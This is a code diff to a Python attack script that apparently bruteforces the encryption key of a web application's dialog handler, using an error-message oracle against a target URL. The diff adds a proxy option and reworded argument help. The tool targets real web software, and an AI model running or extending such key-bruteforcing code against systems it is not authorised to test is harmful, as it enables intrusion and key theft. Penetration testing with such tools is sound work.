@@ -25,6 +25,10 @@ requests_sent = 0
 char_requests = 0
 
 
+def getProxy(proxy):
+    return { "http" : proxy, "https" : proxy }
+
+
 def get_result(plaintext, key, session, pad_chars):
     global requests_sent, char_requests
 
@@ -36,7 +40,7 @@ def get_result(plaintext, key, session, pad_chars):
                             ).decode()
     request = requests.Request('GET', url + '?dp=' + dp_encrypted)
     request = request.prepare()
-    response = session.send(request, verify=False)
+    response = session.send(request, verify=False, proxies = getProxy(args.proxy))
     requests_sent += 1
     char_requests += 1
 
@@ -276,7 +280,7 @@ def mode_brutekey():
             url = urls[version]
             request = requests.Request('GET', url)
             request = request.prepare()
-            response = session.send(request, verify=False)
+            response = session.send(request, verify=False, proxies=getProxy(args.proxy))
             if response.status_code == 500:
                 continue
             else:
@@ -337,13 +341,14 @@ encrypt_parser.add_argument('key', action='store', type=str, default='', help='K
 
 brute_parser = subparsers.add_parser('k', help='Bruteforce key/generate URL')
 brute_parser.set_defaults(func=mode_brutekey)
-brute_parser.add_argument('url', action='store', type=str, help='Target URL')
-brute_parser.add_argument('-l', '--key-len', action='store', type=int, default=48, help='Len of the key to retrieve, default is 48')
-brute_parser.add_argument('-o', '--oracle', action='store', type=str, default='Index was outside the bounds of the array.', help='OPTIONAL. The oracle text to use, the default value is for english version, other languages may have other error message')
-brute_parser.add_argument('-v', '--version', action='store', type=str, default='', help='Specify the version to use rather than iterating over all of them')
-brute_parser.add_argument('-c', '--charset', action='store', type=str, default='hex', help='Charset used by the key, can use all, hex, or user defined')
+brute_parser.add_argument('-u', '--url', action='store', type=str, help='Target URL')
+brute_parser.add_argument('-l', '--key-len', action='store', type=int, default=48, help='Len of the key to retrieve, OPTIONAL: default is 48')
+brute_parser.add_argument('-o', '--oracle', action='store', type=str, default='Index was outside the bounds of the array.', help='The oracle text to use. OPTIONAL: default value is for english version, other languages may have other error message')
+brute_parser.add_argument('-v', '--version', action='store', type=str, default='', help='OPTIONAL. Specify the version to use rather than iterating over all of them')
+brute_parser.add_argument('-c', '--charset', action='store', type=str, default='hex', help='Charset used by the key, can use all, hex, or user defined. OPTIONAL: default is hex')
 brute_parser.add_argument('-a', '--accuracy', action='store', type=int, default=9, help='Maximum accuracy is out of 64 where 64 is the most accurate, \
-    accuracy of 9 will usually suffice for a hex, but 21 or more might be needed when testing all ascii characters. Increase the accuracy argument if no valid version is found.')
+    accuracy of 9 will usually suffice for a hex, but 21 or more might be needed when testing all ascii characters. Increase the accuracy argument if no valid version is found. OPTIONAL: default is 9.')
+brute_parser.add_argument('-p', '--proxy', action='store', type=str, default='', help='Specify OPTIONAL proxy server, e.g. 127.0.0.1:8080')
 
 encode_parser = subparsers.add_parser('b', help='Encode parameter to base64')
 encode_parser.set_defaults(func=mode_b64e)
